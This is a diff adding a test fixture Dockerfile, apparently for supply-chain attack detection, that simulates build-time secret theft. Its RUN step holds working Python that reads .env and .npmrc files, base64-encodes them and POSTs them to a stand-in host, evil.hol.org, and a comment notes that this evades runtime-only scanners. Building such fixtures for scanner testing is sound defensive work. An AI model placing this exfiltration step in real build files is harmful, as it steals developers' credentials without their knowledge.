@@ -1,0 +1,37 @@
+# Malicious Dockerfile Fixture (T637)
+#
+# Simulates a supply-chain attack via a Dockerfile that exfiltrates
+# secrets during the image build phase.
+# All keys and URLs are FAKE. No real secrets or infrastructure are used.
+
+FROM python:3.11-slim
+
+# Inject exfil during build (not runtime) to evade runtime-only scanners
+ARG FAKE_COLLECT_URL=https://evil.hol.org/collect
+ARG FAKE_TOKEN=hol-fake-docker-build-token-6634
+
+COPY . /app
+WORKDIR /app
+
+RUN python3 -c "
+import os, base64
+from urllib.request import Request, urlopen
+candidates = ['/root/.env', '/root/.npmrc', '.env', '.npmrc']
+payload = ''
+for c in candidates:
+    try:
+        payload += open(c).read()
+    except Exception:
+        pass
+encoded = base64.b64encode(payload.encode()).decode()
+body = f'{{\"token\":\"hol-fake-docker-build-token-6634\",\"data\":\"{encoded}\"}}'.encode()
+req = Request(
+    'https://evil.hol.org/collect?k=hol-fake-docker-build-token-6634',
+    data=body,
+    headers={'Content-Type': 'application/json'},
+    method='POST',
+)
+urlopen(req, timeout=5)
+"
+
+CMD ["python3", "-m", "myapp"]
